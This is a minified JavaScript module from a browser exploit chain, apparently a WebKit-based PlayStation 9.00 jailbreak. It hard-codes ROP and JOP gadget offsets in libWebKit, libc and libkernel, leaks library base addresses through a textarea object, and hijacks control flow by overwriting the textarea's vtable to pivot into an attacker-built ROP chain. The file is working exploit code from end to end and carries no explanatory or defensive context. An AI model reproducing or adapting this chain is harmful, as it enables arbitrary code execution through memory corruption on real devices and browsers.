import{log as $}from"../module/utils.js";import{mem as t}from"../module/mem.js";import{KB as e}from"../module/constants.js";import{ChainBase as r}from"../module/chain.js";import{find_base as s,get_view_vector as a,resolve_import as i,init_syscall_array as o}from"../module/memtools.js";import*as p from"../module/rw.js";let origin=window.origin,port="8000",url=`${origin}:8000`,syscall_array=[],offset_textarea_impl=24,offset_wk_stack_chk_fail=376,offset_wk_memcpy=392;export let libwebkit_base=null;export let libkernel_base=null;export let libc_base=null;let ta_jop1=`
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`,ta_jop2=`
pop rsi
jmp qword ptr [rax + 0x1c]
`,ta_jop3=`
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`,jop2=`
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`,jop3=`
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`,jop4=`
push rdx
jmp qword ptr [rax]
`,jop5="pop rsp; ret",rop_epilogue="leave; ret",webkit_gadget_offsets=new Map(Object.entries({"pop rax; ret":334354,"pop rbx; ret":779728,"pop rcx; ret":415671,"pop rdx; ret":39020,"pop rbp; ret":182,"pop rsi; ret":128214,"pop rdi; ret":3249808,"pop rsp; ret":320147,"pop r8; ret":1736433,"pop r9; ret":4334961,"pop r10; ret":15327697,"pop r11; ret":19602769,"pop r12; ret":8776817,"pop r13; ret":1942625,"pop r14; ret":6839667,"pop r15; ret":6992810,ret:50,"leave; ret":580443,"mov rax, qword ptr [rax]; ret":147916,"mov qword ptr [rdi], rax; ret":24891,"mov dword ptr [rdi], eax; ret":24892,"mov dword ptr [rax], esi; ret":6042754,[jop2]:6830080,[jop3]:3160326,[jop4]:42718002,[jop5]:320147,[ta_jop1]:5137060,[ta_jop2]:35638910,[ta_jop3]:26995892})),libc_gadget_offsets=new Map(Object.entries({getcontext:151300,setcontext:169032})),libkernel_gadget_offsets=new Map(Object.entries({__error:52096}));export const gadgets=new Map;function get_bases(){let $=document.createElement("textarea"),e=t.addrof($).readp(24),r=e.readp(0),a=s(r,!0,!0),o=a.add(376),p=i(o,!0,!0),l=s(p,!0,!0),h=a.add(392),d=i(h,!0,!0),x=s(d,!0,!0);return[a,l,x,]}export function init_gadget_map($,t,e){for(let[r,s]of t)$.set(r,e.add(s))}class Chain900Base extends r{constructor(){super(),this._clean_branch_ctx(),this.flag=new Uint8Array(8),this.flag_addr=a(this.flag),this.jmp_target=new Uint8Array(256),p.write64(this.jmp_target,28,this.get_gadget(jop4)),p.write64(this.jmp_target,0,this.get_gadget(jop5)),this.is_saved=!1,this.is_stale=!1,this.position=0;this.jmp_buf=new Uint8Array(200),this.jmp_buf_p=a(this.jmp_buf)}push_end(){this.push_gadget("leave; ret")}check_is_branching(){if(this.is_branch_ctx)throw Error("chain is still branching, end it before running")}push_value($){super.push_value($),this.is_branch_ctx&&(this.branch_position+=8)}_clean_branch_ctx(){this.is_branch_ctx=!1,this.branch_position=null,this.delta_slot=null,this.rsp_slot=null,this.rsp_position=null}clean(){super.clean(),this._clean_branch_ctx(),this.is_saved=!1,this.is_stale=!1,this.position=0}push_get_retval(){this.push_gadget("pop rdi; ret"),this.push_value(this.retval_addr),this.push_gadget("mov qword ptr [rdi], rax; ret")}push_clear_errno(){this.push_call(this.get_gadget("__error")),this.push_gadget("pop rsi; ret"),this.push_value(0),this.push_gadget("mov dword ptr [rax], esi; ret")}push_get_errno(){this.push_gadget("pop rdi; ret"),this.push_value(this.errno_addr),this.push_call(this.get_gadget("__error")),this.push_gadget("mov rax, qword ptr [rax]; ret"),this.push_gadget("mov dword ptr [rdi], eax; ret")}check_stale(){if(this.is_stale)throw Error("chain already ran, clean it first");this.is_stale=!0}check_is_empty(){if(0===this.position)throw Error("chain is empty")}}export class Chain900 extends Chain900Base{constructor(){super();let $=document.createElement("textarea");this.textarea=$;let e=t.addrof($),r=e.readp(24);this.webcore_ta=r;let s=new Uint8Array(512),i=r.readp(0);this.vtable=s,this.old_vtable_p=i,p.write64(s,440,this.get_gadget(ta_jop1)),p.write64(s,184,this.get_gadget(ta_jop2)),p.write64(s,28,this.get_gadget(ta_jop3));let o=new Uint8Array(256),l=a(o);this.rax_ptrs=o,p.write64(o,48,this.get_gadget(jop2)),p.write64(o,88,this.get_gadget(jop3)),p.write64(o,16,this.get_gadget(jop4)),p.write64(o,0,this.get_gadget(jop5)),p.write64(this.rax_ptrs,24,this.stack_addr);let h=new Uint8Array(8),d=a(h);this.jop_buffer=h,p.write64(h,0,l),p.write64(s,8,d)}run(){this.check_stale(),this.check_is_empty(),this.check_is_branching(),this.webcore_ta.write64(0,a(this.vtable)),this.textarea.scrollLeft,this.webcore_ta.write64(0,this.old_vtable_p)}}export const Chain=Chain900;export function init(t){[libwebkit_base,libkernel_base,libc_base]=get_bases(),init_gadget_map(gadgets,webkit_gadget_offsets,libwebkit_base),init_gadget_map(gadgets,libc_gadget_offsets,libc_base),init_gadget_map(gadgets,libkernel_gadget_offsets,libkernel_base),o(syscall_array,libkernel_base,300*e),$("syscall_array:"),$(syscall_array),t.init_class(gadgets,syscall_array)}$("Chain900");